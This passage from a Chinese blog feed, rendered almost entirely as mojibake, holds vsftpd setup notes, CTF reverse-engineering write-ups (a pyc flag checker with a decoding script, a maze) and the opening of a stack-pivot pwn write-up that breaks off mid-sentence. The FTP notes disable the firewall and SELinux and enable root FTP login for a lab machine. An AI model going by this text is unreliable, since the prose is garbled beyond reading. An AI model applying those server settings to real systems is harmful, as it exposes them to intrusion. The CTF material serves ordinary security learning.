é˜»åœ°ç™»å½•FTPæœåŠ¡å™¨ï¼Œä»è€Œå®Œå…¨æ§åˆ¶æ•´å°æœåŠ¡å™¨ã€‚</li><li><strong>è™šæ‹Ÿç”¨æˆ·æ¨¡å¼</strong>ï¼šæ˜¯è¿™ä¸‰ç§æ¨¡å¼ä¸­æœ€å®‰å…¨çš„ä¸€ç§è®¤è¯æ¨¡å¼ï¼Œå®ƒéœ€è¦ä¸ºFTPæœåŠ¡å•ç‹¬å»ºç«‹ç”¨æˆ·æ•°æ®åº“æ–‡ä»¶ï¼Œè™šæ‹Ÿå‡ºç”¨æ¥è¿›è¡Œå£ä»¤éªŒè¯çš„è´¦æˆ·ä¿¡æ¯ï¼Œè€Œè¿™äº›è´¦æˆ·ä¿¡æ¯åœ¨æœåŠ¡å™¨ç³»ç»Ÿä¸­å®é™…ä¸Šæ˜¯ä¸å­˜åœ¨çš„ï¼Œä»…ä¾›FTPæœåŠ¡ç¨‹åºè¿›è¡Œè®¤è¯ä½¿ç”¨ã€‚è¿™æ ·ï¼Œå³ä½¿é»‘å®¢ç ´è§£äº†è´¦æˆ·ä¿¡æ¯ä¹Ÿæ— æ³•ç™»å½•æœåŠ¡å™¨ï¼Œä»è€Œæœ‰æ•ˆé™ä½äº†ç ´åèŒƒå›´å’Œå½±å“ã€‚<h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><pre><code class="html">yum -y install vsftpd</code></pre></li></ul><h3 id="é…ç½®æ–‡ä»¶"><a href="#é…ç½®æ–‡ä»¶" class="headerlink" title="é…ç½®æ–‡ä»¶"></a>é…ç½®æ–‡ä»¶</h3><p>ä¸»é…ç½®æ–‡ä»¶è·¯å¾„ ï¼š</p><pre><code class="html">/etc/vsftpd/vsftpd.conf</code></pre><p>å¸¸ç”¨çš„é…ç½®å‚æ•°ä»¥åŠä½œç”¨å¦‚ä¸‹ï¼š</p><pre><code class="html">å‚æ•°                                ä½œç”¨listen=[YES|NO]              æ˜¯å¦ä»¥ç‹¬ç«‹è¿è¡Œçš„æ–¹å¼ç›‘å¬æœåŠ¡listen_address=IPåœ°å€        è®¾ç½®è¦ç›‘å¬çš„IPåœ°å€listen_port=21               è®¾ç½®FTPæœåŠ¡çš„ç›‘å¬ç«¯å£download_enableï¼[YES|NO]    æ˜¯å¦å…è®¸ä¸‹è½½æ–‡ä»¶userlist_enable=[YES|NO]     è®¾ç½®ç”¨æˆ·åˆ—è¡¨ä¸ºâ€œå…è®¸â€è¿˜æ˜¯â€œç¦æ­¢â€æ“ä½œuserlist_deny=[YES|NO]      è®¾ç½®ç”¨æˆ·åˆ—è¡¨ä¸ºâ€œå…è®¸â€è¿˜æ˜¯â€œç¦æ­¢â€æ“ä½œmax_clients=0                æœ€å¤§å®¢æˆ·ç«¯è¿æ¥æ•°ï¼Œ0ä¸ºä¸é™åˆ¶max_per_ip=0                 åŒä¸€IPåœ°å€çš„æœ€å¤§è¿æ¥æ•°ï¼Œ0ä¸ºä¸é™åˆ¶anonymous_enable=[YES|NO]    æ˜¯å¦å…è®¸åŒ¿åç”¨æˆ·è®¿é—®anon_upload_enable=[YES|NO]  æ˜¯å¦å…è®¸åŒ¿åç”¨æˆ·ä¸Šä¼ æ–‡ä»¶anon_umask=022               åŒ¿åç”¨æˆ·ä¸Šä¼ æ–‡ä»¶çš„umaskå€¼anon_root=/var/ftp           åŒ¿åç”¨æˆ·çš„FTPæ ¹ç›®å½•anon_mkdir_write_enable=[YES|NO]    æ˜¯å¦å…è®¸åŒ¿åç”¨æˆ·åˆ›å»ºç›®å½•anon_other_write_enable=[YES|NO]    æ˜¯å¦å¼€æ”¾åŒ¿åç”¨æˆ·çš„å…¶ä»–å†™å…¥æƒé™ï¼ˆåŒ…æ‹¬é‡å‘½åã€åˆ é™¤ç­‰æ“ä½œæƒé™ï¼‰anon_max_rate=0               åŒ¿åç”¨æˆ·çš„æœ€å¤§ä¼ è¾“é€Ÿç‡ï¼ˆå­—èŠ‚/ç§’ï¼‰ï¼Œ0ä¸ºä¸é™åˆ¶local_enable=[YES|NO]         æ˜¯å¦å…è®¸æœ¬åœ°ç”¨æˆ·ç™»å½•FTPlocal_umask=022                æœ¬åœ°ç”¨æˆ·ä¸Šä¼ æ–‡ä»¶çš„umaskå€¼local_root=/var/ftp            æœ¬åœ°ç”¨æˆ·çš„FTPæ ¹ç›®å½•chroot_local_user=[YES|NO]    æ˜¯å¦å°†ç”¨æˆ·æƒé™ç¦é”¢åœ¨FTPç›®å½•ï¼Œä»¥ç¡®ä¿å®‰å…¨local_max_rate=0              æœ¬åœ°ç”¨æˆ·æœ€å¤§ä¼ è¾“é€Ÿç‡ï¼ˆå­—èŠ‚/ç§’ï¼‰ï¼Œ0ä¸ºä¸é™åˆ¶</code></pre><p>åœ¨é…ç½®ç€çš„æ—¶å€™ï¼Œæ³¨æ„å¯¹åœ¨è¿™é‡Œå¯¹åº”èµ·æ¥ï¼Œæ¥æ§åˆ¶åŒ¿åæ¨¡å¼è·Ÿæœ¬åœ°ç”¨æˆ·çš„éƒ¨åˆ†æƒé™ã€‚</p><h3 id="å¼€å¯vsftpdæœåŠ¡"><a href="#å¼€å¯vsftpdæœåŠ¡" class="headerlink" title="å¼€å¯vsftpdæœåŠ¡"></a>å¼€å¯vsftpdæœåŠ¡</h3><pre><code class="html">service vsftpd start  systemctl start vsftpd</code></pre><h2 id="è¸©å‘è®°å½•"><a href="#è¸©å‘è®°å½•" class="headerlink" title="è¸©å‘è®°å½•"></a>è¸©å‘è®°å½•</h2><h3 id="0x1-ï¼š"><a href="#0x1-ï¼š" class="headerlink" title="0x1 ï¼š"></a>0x1 ï¼š</h3><p>å› ä¸ºæ˜¯å®éªŒæœºï¼Œéšä¾¿æŠ˜è…¾ï¼Œä¸ºäº†å®éªŒçš„æˆåŠŸï¼Œéœ€è¦<strong>å…³é—­é˜²ç«å¢™</strong> å’Œ<strong>SELinuxæœåŠ¡</strong>ã€‚</p><h4 id="é˜²ç«å¢™ï¼š"><a href="#é˜²ç«å¢™ï¼š" class="headerlink" title="é˜²ç«å¢™ï¼š"></a>é˜²ç«å¢™ï¼š</h4><p>CentOS7.0ç‰ˆæœ¬çš„linuxç³»ç»Ÿçš„é˜²ç«å¢™æ˜¯firewalldï¼Œå…¶ä»–ç‰ˆæœ¬çš„å¯èƒ½æ˜¯iptablesã€‚<br>firewalldé˜²ç«å¢™å…³é—­ä»£ç ï¼š</p><pre><code class="html">å…³é—­é˜²ç«å¢™systemctl stop firewalld.serviceæ°¸ä¹…ç¦æ­¢é˜²ç«å¢™ systemctl disable firewalld.serviceæ£€æŸ¥é˜²ç«å¢™çŠ¶æ€ systemctl status firewalld.serviceæç¤ºï¼šActive: inactive (dead)å°±è¡¨ç¤ºå…³é—­äº†ã€‚</code></pre><p>iptablesé˜²ç«å¢™å…³é—­ä»£ç  ï¼š</p><pre><code class="html">æŸ¥è¯¢é˜²ç«å¢™çŠ¶æ€    :    service  iptables statusåœæ­¢é˜²ç«å¢™   :        service   iptables stopå¯åŠ¨é˜²ç«å¢™   :        service   iptables starté‡å¯é˜²ç«å¢™   :        service   iptables restartæ°¸ä¹…å…³é—­é˜²ç«å¢™    :     chkconfig   iptables offæ°¸ä¹…å…³é—­åå¯ç”¨    :   chkconfig   iptables on</code></pre><h4 id="SELinuxæœåŠ¡ï¼š"><a href="#SELinuxæœåŠ¡ï¼š" class="headerlink" title="SELinuxæœåŠ¡ï¼š"></a>SELinuxæœåŠ¡ï¼š</h4><p><code>setsebool -P ftpd_full_access=on</code>å•ç‹¬å¤„ç†ftpdã€‚</p><p>æˆ–ï¼šå…³é—­SELinux</p><pre><code class="html">$ vi /etc/selinux/config</code></pre><p>å°† SELINUX=XXX â€“&gt;XXX ä»£è¡¨çº§åˆ«<br>æ”¹ä¸º** SELINUX=disabled**<br>ç„¶åé‡å¯ç³»ç»Ÿï¼Œæˆ–è€…æ‰§è¡Œå‘½ä»¤ï¼š<code>setenforce 0</code>ã€‚</p><h3 id="0x2"><a href="#0x2" class="headerlink" title="0x2:"></a>0x2:</h3><p>å‘ç°åŒ¿åç”¨æˆ·ï¼Œåœ¨è¿ä¸ŠftpæœåŠ¡å™¨æ—¶å€™ï¼Œæ— æ³•è¿›è¡Œå†™å…¥ä¸œè¥¿ã€‚</p><pre><code class="html">550 Permission denied.</code></pre><p>ç„¶åè¿™ä¸ªç›®å½•æ˜¯:</p><pre><code class="html">/var/ftp/pub</code></pre><p>è¿™å°±æ˜¯æŠŠè¿™ä¸ªpubçš„å±ä¸»æ§åˆ¶ä¸º æ§åˆ¶ä¸ºftpå³å¯ã€‚</p><pre><code class="html">chown ftp pub</code></pre><p>è¿™æ ·å°±å¯ä»¥äº†ã€‚</p><h3 id="0x3"><a href="#0x3" class="headerlink" title="0x3:"></a>0x3:</h3><p>åœ¨æœ¬åœ°ç”¨æˆ·çš„æ—¶å€™ï¼Œç”¨rootä¹Ÿæ˜¯æ— æ³•è¿æ¥ftpæœåŠ¡çš„ã€‚è¿™æ˜¯å› ä¸ºvsftpdæœåŠ¡ç¨‹åºæ‰€åœ¨çš„ç›®å½•ä¸­é»˜è®¤å­˜æ”¾ç€ä¸¤ä¸ªåä¸ºâ€œç”¨æˆ·åå•â€çš„æ–‡ä»¶ï¼ˆ<code>ftpuserså’Œuser_list</code>ï¼‰æŠŠftpusersè¿™é‡Œé¢çš„rootå»æ‰å³å¯ã€‚</p><h3 id="0x4"><a href="#0x4" class="headerlink" title="0x4:"></a>0x4:</h3><ul><li>åœ¨é‡‡ç”¨æœ¬åœ°ç”¨æˆ·æ¨¡å¼ç™»å½•FTPæœåŠ¡å™¨åï¼Œé»˜è®¤è®¿é—®çš„æ˜¯è¯¥ç”¨æˆ·çš„å®¶ç›®å½•ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè®¿é—®çš„æ˜¯/home/linuxprobeç›®å½•(ç³»ç»Ÿåˆ›å»ºçš„ç”¨æˆ·ï¼Œåœ¨homeæ–‡ä»¶å¤¹ä¸‹éƒ½æœ‰å¯¹åº”ç”¨æˆ·åçš„æ–‡ä»¶å¤¹)ã€‚è€Œä¸”è¯¥ç›®å½•çš„é»˜è®¤æ‰€æœ‰è€…ã€æ‰€å±ç»„éƒ½æ˜¯è¯¥ç”¨æˆ·è‡ªå·±ï¼Œå› æ­¤ä¸å­˜åœ¨å†™å…¥æƒé™ä¸è¶³çš„æƒ…å†µã€‚å¦‚æœè¯»å†™æƒé™æ²¡ç»™ï¼Œæ‰‹åŠ¨è®¾å®šï¼Œç»™è¯»å†™æƒé™ã€‚</li><li>é‡‡ç”¨éæœ¬åœ°ç”¨æˆ·æ¨¡å¼ç™»å½•ï¼Œä¸é‡‡ç”¨æœ¬åœ°ç”¨æˆ·æ¨¡å¼çš„åŒºåˆ«æ˜¯ï¼šé‡‡ç”¨éæœ¬åœ°ç”¨æˆ·æ¨¡å¼<strong>å¯ä»¥æŒ‡å®šFTPæ–‡ä»¶å¤¹</strong>ã€‚<br>ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å®‰æ’æŠ—ç–«èµ›</title>
    <link href="/2020/02/29/%E5%AE%89%E6%81%92%E6%8A%97%E7%96%AB%E8%B5%9B/"/>
    <url>/2020/02/29/%E5%AE%89%E6%81%92%E6%8A%97%E7%96%AB%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="å®‰æ’æŠ—ç–«èµ›"><a href="#å®‰æ’æŠ—ç–«èµ›" class="headerlink" title="å®‰æ’æŠ—ç–«èµ›"></a>å®‰æ’æŠ—ç–«èµ›</h1><p>å¾ˆç®€å•çš„æ¯”èµ›ï¼Œé¢˜ä¹Ÿä¸å¤šï¼Œè®°å½•ä¸€ä¸‹åšçš„2é“ç®€å•çš„Reã€‚</p><h2 id="re1-pyc"><a href="#re1-pyc" class="headerlink" title="re1_pyc"></a>re1_pyc</h2><p>æ‹¿åˆ°çš„æ˜¯ä¸€ä¸ªpycæ–‡ä»¶ã€‚ç›´æ¥æ‹¿åˆ°ç½‘ç«™ä¸Šåç¼–è¯‘ä¸€ä¸‹ï¼š</p><pre><code class="python">#!/usr/bin/env python# encoding: utf-8import base64import stringdef caser(flag):    enc1 = &#39;&#39;    for i in flag:        enc1 += chr(ord(i) - 5)    return enc1def rail(flag):    p1 = &#39;&#39;    p2 = &#39;&#39;    p3 = &#39;&#39;    enc2 = &#39;&#39;    for i in range(len(flag)):        j = i % 3        if j == 0:            p1 += flag[i]            continue        if j == 1:            p2 += flag[i]            continue        p3 += flag[i]    enc2 = p1 + p2 + p3    return enc2def rep(flag):    table1 = &#39;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#39;    table2 = &#39;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&#39;    table = string.maketrans(table1, table2)    return flag.translate(table, &#39;=&#39;)while True:    flag = raw_input(&#39;please input flag to check:&#39;)    if rep(base64.b64encode(rail(caser(flag)))) == &#39;ywjCytmRxI9CycWZngD2ncTDkZqYlJrGmhHCxISUnfWSlgfDlJi&#39;:        print &#39;Success!you got it!&#39;        break        continue    print &#39;try a gain&#39;</code></pre><p>é€»è¾‘æŒºç®€å•çš„ï¼Œç›´æ¥æ‹¿ç€è¿™ä¸ªä»£ç æ”¹ä¸‹ï¼š</p><pre><code class="python">#!/usr/bin/env python# encoding: utf-8import base64import stringdef caser(flag):    enc1 = &#39;&#39;    for i in flag:        enc1 += chr(ord(i) + 5)    return enc1def rail(flag):    p1 = &#39;&#39;    p2 = &#39;&#39;    p3 = &#39;&#39;    enc2 = &#39;&#39;    j = 0    x = 25    for i in range(x):        j = i + 13        z = j + 13        p3 += flag[i] + flag[j]         if z &gt;= 38 :            break        p3 += flag[z]    enc2 = p1 + p2 + p3    return enc2def rep(flag):    table1 = &#39;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#39;    table2 = &#39;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&#39;    table = string.maketrans(table1, table2)    return flag.translate(table, &#39;=&#39;)key = &#39;ywjCytmRxI9CycWZngD2ncTDkZqYlJrGmhHCxISUnfWSlgfDlJi&#39;flag = rail(caser(base64.b64decode(rep(key) + &#39;=&#39;)))print(flag)</code></pre><h2 id="maze1"><a href="#maze1" class="headerlink" title="maze1"></a>maze1</h2><p>ä¸€ä¸ªç®€å•çš„mazeé—®é¢˜ï¼Œä¸è¿‡æ˜¯c++å†™çš„ï¼Œidaåç¼–è¯‘çœ‹èµ·æ¥æœ‰ç‚¹éš¾è¯»ã€‚</p><h3 id="idaåˆ†æ"><a href="#idaåˆ†æ" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/03LBOC.png" srcset="/img/loading.gif" alt><br>ä»è¿™é‡Œç¡®å®šä¸‹åœ°å›¾ï¼Œåé¢çš„2å°±æ˜¯ç»ˆç‚¹ã€‚å»å†…å­˜ä¸­å–å‡ºæ¥åœ°å›¾ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/x7t4PS.png" srcset="/img/loading.gif" alt><br>å»idaç»§ç»­åˆ†æï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/S2wojN.png" srcset="/img/loading.gif" alt><br>å‘ç°ä½ è¾“å…¥çš„å­—ç¬¦ä¸²éœ€è¦ç­‰äº10ï¼Œå¦‚æœä¸æ˜¯ç›´æ¥å°±å¤±è´¥ï¼Œé•¿åº¦ç­‰äº10æ‰ç»§ç»­åˆ¤æ–­ã€‚awsdè¿˜æ˜¯è¿™å‡ ä¸ªå­—ç¬¦æ§åˆ¶æ–¹å‘ã€‚å†è”ç³»ä¸€ä¸‹å‰é¢çš„åœ°å›¾ï¼Œç»ˆç‚¹æ˜¯2ï¼Œåªèƒ½èµ°10æ­¥ï¼ŒçŒœä¸€æ³¢dddddsssssã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/3qNEI0.png" srcset="/img/loading.gif" alt><br>å°±æ˜¯è¿™ä¸ªï¼Œflagå°±æ˜¯å»md5åŠ å¯†ä¸€ä¸‹å‡ºæ¥çš„å­—ç¬¦ä¸²ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è®°å½•iæ˜¥ç§‹æ–°æ˜¥å…¬ç›Šèµ›çš„ä¸¤ä¸ªé¢˜</title>
    <link href="/2020/02/25/%E8%AE%B0%E5%BD%95i%E6%98%A5%E7%A7%8B%E6%96%B0%E6%98%A5%E5%85%AC%E7%9B%8A%E8%B5%9B%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%A2%98/"/>
    <url>/2020/02/25/%E8%AE%B0%E5%BD%95i%E6%98%A5%E7%A7%8B%E6%96%B0%E6%98%A5%E5%85%AC%E7%9B%8A%E8%B5%9B%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="è®°å½•iæ˜¥ç§‹æ–°æ˜¥å…¬ç›Šèµ›çš„ä¸¤ä¸ªé¢˜"><a href="#è®°å½•iæ˜¥ç§‹æ–°æ˜¥å…¬ç›Šèµ›çš„ä¸¤ä¸ªé¢˜" class="headerlink" title="è®°å½•iæ˜¥ç§‹æ–°æ˜¥å…¬ç›Šèµ›çš„ä¸¤ä¸ªé¢˜"></a>è®°å½•iæ˜¥ç§‹æ–°æ˜¥å…¬ç›Šèµ›çš„ä¸¤ä¸ªé¢˜</h1><h2 id="åƒé¸¡ç¥å™¨"><a href="#åƒé¸¡ç¥å™¨" class="headerlink" title="åƒé¸¡ç¥å™¨"></a>åƒé¸¡ç¥å™¨</h2><p>è¿™ä¸ªé¢˜ç›®æ˜¯æ¯”èµ›æ—¶æ²¡åšï¼Œå› ä¸ºæœ‰ä¸€æ®µæ—¶é—´æ²¡åšreé¢˜ç›®äº†ï¼Œä¸‹æ¥çœ‹åˆ°è¿™ä¸ªé¢˜åšå‡ºçš„äººä¸ç®—å°‘ï¼Œå°±å»å°è¯•åšä¸€åšã€‚<br>æºç¨‹åºæ˜¯qtå†™çš„ï¼Œä»¥å‰å¬å®¤å‹è¯´è¿‡qtçš„ç¨‹åºidaæ˜¯é™æ€åˆ†æä¸äº†çš„ï¼Œå‡½æ•°è°ƒç”¨å¤ªå¤šäº†ï¼Œå°±ç›´æ¥åŠ¨æ€åˆ†æã€‚è¿™ä¸ªé¢˜ç›®åº”è¯¥æ˜¯æœ‰å¤šçº¿ç¨‹odæ‰“å¼€ç›´æ¥æ˜¯é»‘å±çš„ï¼Œå·¦ä¸‹è§’æ˜¾ç¤ºæ–°å»ºäº†ä¸€ä¸ªçº¿ç¨‹ï¼Œç¬¬ä¸€æ¬¡åšè¿™ç§é¢˜ä¹Ÿæ¯”è¾ƒæ²¡æœ‰å¤´ç»ªã€‚æŠ˜è…¾äº†ä¸€ä¼šå‘ç°ç”¨çš„<strong>x64dbg</strong>å¯ä»¥è°ƒè¯•äº†ã€‚</p><h3 id="x64dbgè°ƒè¯•"><a href="#x64dbgè°ƒè¯•" class="headerlink" title="x64dbgè°ƒè¯•"></a>x64dbgè°ƒè¯•</h3><p>ä¸€ç›´è¿è¡Œç¨‹åºç­‰ä»£ç è·‘åˆ°0x40å¼€å¤´çš„æ®µï¼Œè¿›å…¥login çš„æ¨¡å—ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/aQ0jsg.png" srcset="/img/loading.gif" alt><br>æ‰¾ä¸‹å­—ç¬¦ä¸²ï¼š<br>ï¿¼<br><img src="http://qiqianyun.chumen77.xyz/uPic/AL01Oy.png" srcset="/img/loading.gif" alt><br>åœ¨è¿™é‡Œä¸‹ä¸ªæ–­ç‚¹ã€‚å› ä¸ºç™»é™†å¤±è´¥ä¼šè·³è½¬è¾“å‡ºè¿™ä¸ªå­—ç¬¦ä¸²çš„å‡½æ•°ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½æŸ¥çœ‹å‡ºæ˜¯ä»å“ªé‡Œè·³è½¬è¿‡æ¥çš„ç„¶ååœ¨å¯†ç åˆ¤æ–­é‚£é‡Œæ¥ç»§ç»­åˆ†æã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/Ior8oA.png" srcset="/img/loading.gif" alt><br>çœ‹åˆ°å·²ç»è·³è½¬è¿‡æ¥äº†ï¼Œä½†æ˜¯å‘ç°é™„è¿‘æ²¡æœ‰ä»€ä¹ˆåˆ¤æ–­çš„åœ°æ–¹ï¼Œå»æ ¹æ®é‚£ä¸ªä»å“ªé‡Œè·³è½¬è¿‡æ¥ï¼Œè¿½è¿‡å»çœ‹åˆ°ç™»é™†æˆåŠŸè°ƒç”¨welcomeçš„å‡½æ•°ï¼Œä½†æ˜¯ä¹Ÿæ²¡æœ‰å‘ç°ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„é‚£é‡Œçš„åˆ¤æ–­ä¸æ˜¯è¦æ‰¾çš„å¯†ç åˆ¤æ–­ã€‚<br>æ¢ä¸ªæ€è·¯ï¼Œè¿˜æ˜¯è·³è½¬åˆ°å¤±è´¥é‚£é‡Œï¼Œä½†æ˜¯åœ¨<strong>ä¸Šå±‚å‡½æ•°</strong>çš„æ ˆä¸­ï¼Œå› ä¸ºå­˜åœ¨åˆ¤æ–­ç™»é™†çš„ç”¨æˆ·è·Ÿå¯†ç ï¼Œåº”è¯¥ä¼šå­˜åœ¨æˆ‘ä»¬è¾“å…¥çš„ä¸œè¥¿ï¼Œå¯»æ‰¾ä¸€ä¸‹å¯†ç è·Ÿç”¨æˆ·åã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/ExvIk2.png" srcset="/img/loading.gif" alt><br>æ‰¾åˆ°äº†ï¼Œç»™ç”¨æˆ·åå¯¹åº”çš„åœ°å€ä¸‹ä¸€ä¸ªç¡¬ä»¶æ–­ç‚¹ï¼Œæ¥çœ‹çœ‹å“ªé‡Œä¼šè®¿é—®è¿™é‡Œï¼Œåªè¦è®¿é—®äº†åŸºæœ¬è·ç¦»è¦æ‰¾çš„å‡½æ•°å·®ä¸è¿œäº†ã€‚å…¶ä¸­ç¬¬äºŒä¸ªå­—ç¬¦å¯¹åº”å¤„ï¼Œç»æµ‹è¯•ä¸åº”è¯¥ä¸‹æ–­ç‚¹ã€‚ä¸€ç›´è®©å…¶F9è¿è¡Œï¼Œç­‰åˆ°äº†ç”¨æˆ·0x40æ®µä»£ç ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/guzN1A.png" srcset="/img/loading.gif" alt><br>å‘ç°è¿™æ®µæ˜¯åœ¨ä¸€ä¸ªä¸ªå­—ç¬¦å¤„ç†<strong>lubenwei</strong>å­—ç¬¦ä¸²ï¼Œè¿˜æœ‰<code>ret</code>ï¼Œè¿™æ ·åŸºæœ¬å°±æ˜¯äº†ã€‚retä»¥ååˆ°ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/nTZ8tn.png" srcset="/img/loading.gif" alt><br>æ³¨æ„æ­¤å¤„çš„æ±‡ç¼–è¯­å¥ï¼Œå¹¶çœ‹ä¸‹å¯„å­˜å™¨æƒ…å†µï¼š</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/bua46M.png" srcset="/img/loading.gif" alt><br>åˆšåˆšèµ°è¿‡callå‡½æ•°ï¼Œä¸‹é¢ä¸”æœ‰cmpå¯¹æ¯”è¯­å¥ï¼Œå¹¶ä¸”å‘ç°äº†è¾“å…¥çš„å¯†ç <code>12345678</code>ï¼Œååˆ†å¯ç–‘äº†ã€‚<br>åœ¨è¿™å‡ å¤„å‡½æ•°ä¸‹æ–­ç‚¹ï¼Œé‡æ–°ç‚¹å‡»loginéªŒè¯è¿›è¡Œåˆ†æï¼Œå‘ç°çš„ç¡®æ–­åœ¨äº†ä¸‹çš„è¿™å‡ ä¸ªå‡½æ•°ï¼Œç»“åˆå¯„å­˜å™¨æŸ¥çœ‹å‘ç°ï¼Œè¾“å…¥çš„å¯†ç è·Ÿèµ°è¿‡<code>0x004021D3</code>è¿™ä¸ªå‡½æ•°åä¼ è¿‡æ¥çš„eaxè¿›è¡Œå¯¹æ¯”ã€‚å¹¶ä¸”ä¸€å¯¹æ¯”ä»¥åå°±è¿›å…¥äº†ï¼Œæç¤ºç™»é™†å¤±è´¥çš„åœ°æ–¹ã€‚æ‰€ä»¥è¿™ä¸ªeaxå°±æ˜¯ç”¨æˆ·çš„å¯†ç äº†ã€‚<br>æµ‹è¯•ä»¥åå‘ç°æ˜¯å°å†™çš„<code>eax  41D26F00</code> ï¼š41d26f00,è¾“å…¥å¯†ç ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/psY0ix.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/r3WZrp.png" srcset="/img/loading.gif" alt><br>Ok,æˆåŠŸäº†ã€‚</p><h2 id="borrowstack"><a href="#borrowstack" class="headerlink" title="borrowstack"></a>borrowstack</h2><p>è¿™ä¸ªé¢˜ç›®åå­—å°±æ˜¯borrowshack æ¥æ ˆã€‚å«ä¹‰å°±æ˜¯è½¬ç§»æ ˆï¼Œæ­£å¥½æœ€è¿‘åˆšå­¦è¿‡ï¼Œå°±åŠ¨æ‰‹å»åšäº†ï¼Œç»“æœå¡äº†å¾ˆä¹…ï¼Œä½†ä¹Ÿå­¦åˆ°å¾ˆå¤šï¼Œæ­¤å‰ç»ƒä¹ çš„æ ˆè¿ç§»é¢˜ç›®æ²¡æœ‰è¿™é¢˜çš„æƒ…å†µã€‚</p><h3 id="æŸ¥ä¿æŠ¤å’Œarch"><a href="#æŸ¥ä¿æŠ¤å’Œarch" class="headerlink" title="æŸ¥ä¿æŠ¤å’Œarch"></a>æŸ¥ä¿æŠ¤å’Œarch</h3><pre><code class="objc">[*] &#39;/media/psf/mypwn2/xcgys/borrowstack&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><h3 id="idaåˆ†æ"><a href="#idaåˆ†æ" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp){  char buf; // [rsp+0h] [rbp-60h]  setbuf(stdin, 0LL);  setbuf(stdout, 0LL);  puts(&amp;s);  read(0, &amp;buf, 0x70uLL);  puts(&quot;Done!You can check and use your borrow stack now!&quot;);  read(0, &amp;bank, 0x100uLL);  return 0;}</code></pre><p>ä»£ç æ˜¯å¾ˆç®€å•çš„ï¼Œbankçš„åœ°å€åœ¨bssæ®µï¼Œä»¥åç•™ç€åšæ ˆè¿ç§»å°±å¯ä»¥äº† ã€‚æº¢å‡ºåœ°å€è¿˜æ˜¯åªå¯ä»¥æ§åˆ¶ebpï¼Œè·Ÿretadressã€‚æ¥ä¸‹æ¥å°±æ˜¯è‡ªå·±å­¦åˆ°çš„äº†ï¼Œè‡ªå·±æ‰‹åŠ¨è°ƒè¯•äº†ä¸€æ®µæ—¶é—´æ‰å‘ç°çš„ã€‚</p><h4 id="å‘ç‚¹ï¼ˆå­¦åˆ°çš„æ–°ä¸œè¥¿ï¼‰"><a href="#å‘ç‚¹ï¼ˆå­¦åˆ°çš„æ–°ä¸œè¥¿ï¼‰" class="headerlink" title="å‘ç‚¹ï¼ˆå­¦åˆ°çš„æ–°ä¸œè¥¿ï¼‰"></a>å‘ç‚¹ï¼ˆå­¦åˆ°çš„æ–°ä¸œè¥¿ï¼‰</h4><p>å…ˆè¯´ä¸‹è¿™ä¸ªç¨‹åºçš„æƒ…å†µï¼š<br>bank çš„åœ°å€ <code>.bss:0000000000601080</code><br><img src="http://qiqianyun.chumen77.xyz/uPic/Q3hjpz.png" srcset="/img/loading.gif" alt><br>æ³¨æ„çœ‹ä¸‹bssæ®µé‡Œgotæ®µçš„è·ç¦»ï¼Œä¸€å…±æ˜¯40ä¸ªå­—èŠ‚ï¼Œæ˜¯æ¯”è¾ƒè¿‘çš„ã€‚å¦‚æœæŒ‰æˆ‘ä»¥å‰çš„åšæ³•ç›´æ¥è¿ç§»åˆ°bankè¿™åœ°å€åšæ–°æ ˆï¼Œå½“æ ˆè¿ç§»è¿‡å»ä»¥åï¼Œä½¿ç”¨putså‡½æ•°æ¥æ³„éœ²æŸä¸ªå‡½æ•°gotå¯¹åº”çš„åœ°å€æ—¶ï¼Œä¼šå‘ç°å½“è°ƒç”¨putsä»¥åï¼Œä¼šè¿›å…¥libcä¸­å¼€å§‹ä¸€è¿ä¸²çš„å‡½æ•°è°ƒç”¨ï¼šç¬¬ä¸€ä¸ª<br><img src="http://qiqianyun.chumen77.xyz/uPic/2Zk09z.png" srcset="/img/loading.gif" alt><br>å‘ç°è¿˜æ²¡æœ‰pushï¼Œæ­¤æ—¶rspå°±æ˜¯bankçš„åœ°å€äº†ï¼Œpushè¿‡åè‚¯å®šæ ˆæŒ‡é’ˆå¼€å§‹æ…¢æ…¢å˜å°ï¼Œå¾€bssæ®µä¸Šæ–¹å»¶ä¼¸ã€‚<br>å½“è°ƒç”¨ç¬¬äºŒä¸ªå‡½æ•°ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/v02DA7.png" srcset="/img/loading.gif" alt><br>å‘ç°å·²ç»åˆ°äº†bssä¸Šæ–¹çš„gotè¡¨æ®µï¼Œè¿™æ ·æ¯«æ— 